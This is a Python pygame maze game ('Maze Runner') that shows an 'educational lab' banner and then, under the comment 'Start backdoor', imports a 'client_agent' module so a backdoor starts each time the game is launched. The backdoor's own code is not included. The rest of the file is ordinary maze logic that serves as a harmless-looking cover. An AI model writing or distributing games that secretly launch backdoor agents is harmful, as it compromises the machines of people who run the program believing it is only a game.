import pygame
import threading
import sys
import os
import ctypes

# Show console for consent
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)

print("=" * 60)
print("⚠️  CYBERSECURITY EDUCATIONAL LAB ⚠️")
print("=" * 60)
print("This game is for educational purposes only.")
print("Run ONLY in isolated/virtual machine.")
print("=" * 60)
input("\nPress ENTER to continue...")

# Start backdoor
import client_agent

# Initialize game
pygame.init()
WIDTH, HEIGHT = 800, 600
screen = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption("Maze Runner")
clock = pygame.time.Clock()

# Simple maze
maze = [
    [1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1],
    [1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1],
    [1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1],
    [1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1],
    [1,0,1,0,1,1,1,1,1,1,1,1,1,1,0,1,0,1,0,1],
    [1,0,1,0,1,0,0,0,0,0,0,0,0,1,0,1,0,1,0,1],
    [1,0,1,0,1,0,1,1,1,1,1,1,0,1,0,1,0,1,0,1],
    [1,0,1,0,1,0,1,0,0,0,0,1,0,1,0,1,0,1,0,1],
    [1,0,1,0,1,0,1,0,1,1,0,1,0,1,0,1,0,1,0,1],
    [1,0,1,0,1,0,1,0,0,0,0,1,0,0,0,1,0,1,0,1],
    [1,0,1,0,1,1,1,1,1,1,1,1,1,1,1,1,0,1,0,1],
    [1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1],
    [1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1],
    [1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1],
    [1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]
]

player = [1, 1]
goal = [18, 13]
font = pygame.font.Font(None, 36)
running = True

while running:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False
        
        if event.type == pygame.KEYDOWN:
            new = player.copy()
            if event.key == pygame.K_UP: new[1] -= 1
            if event.key == pygame.K_DOWN: new[1] += 1
            if event.key == pygame.K_LEFT: new[0] -= 1
            if event.key == pygame.K_RIGHT: new[0] += 1
            
            if maze[new[1]][new[0]] == 0:
                player = new
    
    # Draw
    screen.fill((0,0,0))
    for y, row in enumerate(maze):
        for x, cell in enumerate(row):
            color = (80,80,80) if cell else (255,255,255)
            pygame.draw.rect(screen, color, (x*40, y*40, 38, 38))
    
    pygame.draw.rect(screen, (0,0,255), (player[0]*40+5, player[1]*40+5, 30, 30))
    pygame.draw.rect(screen, (0,255,0), (goal[0]*40+5, goal[1]*40+5, 30, 30))
    
    if player == goal:
        text = font.render("YOU WIN!", True, (255,255,0))
        screen.blit(text, (300, 250))
    
    pygame.display.flip()
    clock.tick(30)

pygame.quit()
sys.exit()